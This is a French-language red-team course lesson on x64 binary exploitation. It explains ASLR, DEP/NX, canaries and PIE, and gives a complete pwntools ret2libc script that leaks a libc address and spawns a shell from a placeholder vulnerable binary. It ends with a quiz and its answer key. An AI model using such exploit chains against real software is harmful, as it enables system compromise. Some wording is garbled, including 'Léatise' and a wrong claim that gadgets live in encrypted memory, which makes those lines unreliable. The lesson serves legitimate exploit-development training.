# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 283 (6h) : Binary Exploitation & Memory Protections (Stack Buffer Overflow x64, ROP Chains, ASLR/DEP Bypass &pwntools)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'**exploitation binaire avancée sur architecture x86_64** ciblée par la certification **OSED** (Offensive Security Exploit Developer) : analyser les protections mémoire modernes (**ASLR, DEP/NX, Stack Canaries, PIE**), construire des chaînes **ROP (Return-Oriented Programming)** pour contourner l'interdiction d'exécution de code en pile, et automatiser l'exploit avec la bibliothèque Python **pwntools**.
>
> **Compétences visées :** `PWN-01` (A) — 64-bit Binary Exploitation & Memory Protections | `PWN-02` (A) — ROP Chain Construction & pwntools Automation

---

## 1) Module — Protections Mémoire Modernes (ASLR, DEP, Canaries, PIE) (2h)

### 📖 Narration/Intuition

Pour neutraliser les attaques par dépassement de tampon (Buffer Overflow), les systèmes d'exploitation modernes appliquent 4 barrières de protection complémentaires :

```
┌─────────────────┬────────────────────────────────────────────────────────────────────────┐
│ Protection      │ Mécanisme de Défense                                                   │
├─────────────────┼────────────────────────────────────────────────────────────────────────┤
│ DEP / NX        │ Data Execution Prevention — Renseigne les pages de pile (Stack) comme   │
│                 │ Non-Exécutables. Empêche l'exécution directe d'un shellcode en pile.   │
├─────────────────┼────────────────────────────────────────────────────────────────────────┤
│ ASLR            │ Address Space Layout Randomization — Léatise les adresses mémoire des │
│                 │ bibliothèques (libc, stack, heap) à chaque exécution du programme.     │
├─────────────────┼────────────────────────────────────────────────────────────────────────┤
│ Stack Canary    │ Valeur aléatoire insérée avant le pointeur de retour (Saved RIP).      │
│                 │ Si la valeur est modifiée lors du crash -> arrêt immédiat (__stack_chk_fail)│
├─────────────────┼────────────────────────────────────────────────────────────────────────┤
│ PIE             │ Position Independent Executable — Léatise l'adresse de base du binaire.│
└─────────────────┴────────────────────────────────────────────────────────────────────────┘
```

---

## 2) Module — Contournement du DEP via ROP Chains (2h)

### 📖 Narration/Intuition

Lorsque la pile n'est pas exécutable (DEP/NX actif), l'attaquant ne peut pas y sauter directement. La technique du **Return-Oriented Programming (ROP)** consiste à réutiliser des petits fragments d'instructions existants dans les bibliothèques chargées (ex: `libc.so`), appelés **Gadgets**, se terminant tous par l'instruction `RET`. En alignant les adresses de ces gadgets en pile, l'attaquant contrôle le flux d'exécution et prépare les arguments pour appeler `execve("/bin/sh")`.

---

## 3) Module — Automation d'Exploit x64 avec pwntools (`exploit_rop.py`) (2h)

### 🛠️ Script d'Exploit ROP x64 complet avec pwntools

```python
from pwn import *

# Configuration du binaire cible
elf = ELF('./vulnerable_binaire_x64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vulnerable_binaire_x64')

# 1) Recherche des gadgets ROP indispensables dans le binaire (ou libc)
# En x64, le premier argument d'une fonction est passé dans le registre RDI
rop_elf = ROP(elf)
pop_rdi = rop_elf.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop_elf.find_gadget(['ret'])[0]

print(f"[+] Gadget 'pop rdi; ret' trouvé à l'adresse : {hex(pop_rdi)}")

# 2) ÉTAPE 1 DE L'EXPLOIT : Fuite d'adresse (Address Leak) pour contourner ASLR
# On appelle puts(puts@GOT) pour lire l'adresse réelle de puts en mémoire RAM
OFFSET = 72 # 64 octets buffer + 8 octets RBP

payload1 = flat(
    b'A' * OFFSET,
    pop_rdi,
    elf.got['puts'],       # RDI = Adresse de puts dans la GOT
    elf.plt['puts'],       # Appeler puts() pour afficher l'adresse réelle
    elf.symbols['main']    # Revenir au main() pour la phase 2 de l'exploit !
)

p.sendlineafter(b'Entrez votre nom : ', payload1)

# Récupérer l'adresse leakée
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

print(f"[!] FUITE ASLR RÉUSSIE ! Adresse de base de la libc : {hex(libc.address)}")

# 3) ÉTAPE 2 DE L'EXPLOIT : Exécution de system("/bin/sh") via ROP
bin_sh = next(libc.search(b'/bin/sh'))
system_addr = libc.symbols['system']

payload2 = flat(
    b'A' * OFFSET,
    ret_gadget,            # Alignement de pile 16-bytes (exigence x64)
    pop_rdi,
    bin_sh,                # RDI = Adresse de la chaîne "/bin/sh"
    system_addr            # Appeler system("/bin/sh") !
)

p.sendlineafter(b'Entrez votre nom : ', payload2)

# Interagir avec le Shell Obtenu !
print("[+] SHELL OBTENU ! Passage en mode interactif :")
p.interactive()
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **DEP / NX** | Data Execution Prevention / No-Execute — Protection mémoire empêchant l'exécution en pile |
| **ASLR** | Address Space Layout Randomization — Léatisation des adresses mémoire au lancement |
| **ROP** | Return-Oriented Programming — Technique d'exploitation réutilisant des gadgets se terminant par RET |
| **pwntools** | Bibliothèque Python de référence universelle pour le développement d'exploits binaires (CTF/Pwn) |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle protection mémoire empêche l'exécution directe d'un shellcode injecté dans la pile (Stack) d'un programme ?
- A) DEP / NX (Data Execution Prevention / No-Execute)
- B) ASLR
- C) PIE
- D) Ret2libc

**Réponse : A**

**Q2 :** Pourquoi la technique du **ROP (Return-Oriented Programming)** permet-elle de contourner la protection DEP/NX ?
- A) Parce qu'elle n'injecte pas de nouveau code exécutable, mais réutilise des instructions légitimes existantes en mémoire chiffrée (gadgets se terminant par RET)
- B) Parce qu'elle désactive l'antivirus
- C) Parce qu'elle supprime le mot de passe root
- D) Parce qu'elle modifie le fichier source

**Réponse : A**

**Q3 :** En architecture x86_64 Linux, dans quel registre processeur le **premier argument** d'une fonction doit-il être placé avant un appel système ou une fonction comme `system()` ?
- A) Registre `RDI`
- B) Registre `RAX`
- C) Registre `RSP`
- D) Registre `RBX`

**Réponse : A**

**Q4 :** Quelle bibliothèque Python est l'outil standard incontournable utilisé par les chercheurs en sécurité pour développer et automatiser des exploits binaires (Buffer Overflow, ROP, Format Strings) ?
- A) pwntools
- B) requests
- C) Django
- D) Flask

**Réponse : A**

**Q5 :** Quel est le rôle d'une fuite d'adresse (**Address Leak**) dans l'exploitation d'un binaire protégé par **ASLR** ?
- A) Déduire l'adresse de base réelle de la bibliothèque `libc` en mémoire RAM pour calculer les adresses exactes de `system()` et `/bin/sh`
- B) Effacer le disque dur
- C) Arrêter le serveur web
- D) Compresser le binaire

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
